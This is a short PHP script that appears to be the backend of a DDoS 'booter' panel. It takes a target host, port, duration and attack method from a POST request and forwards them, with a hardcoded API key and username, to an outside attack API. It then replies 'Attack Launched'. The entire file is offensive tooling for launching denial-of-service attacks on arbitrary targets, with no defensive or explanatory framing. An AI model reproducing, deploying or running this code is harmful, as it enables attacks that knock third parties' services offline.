<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    header('Content-Type: application/json');

    $data = json_decode(file_get_contents('php://input'), true);

    $host = $data['host'] ?? '';
    $port = $data['port'] ?? '';
    $time = $data['time'] ?? '';
    $method = $data['method'] ?? '';

    if (!$host || !$port || !$time || !$method) {
        echo json_encode(['message' => 'Invalid request']);
        exit;
    }

    $apiKey = "lizard@keis";
    $username = "lizardpredator";
    $url = "https://www.thedailywash.co.id/tesdt/api?key=$apiKey&username=$username&host=$host&port=$port&time=$time&method=$method";

    $response = file_get_contents($url);
    echo json_encode(['message' => 'Attack Launched']);
}
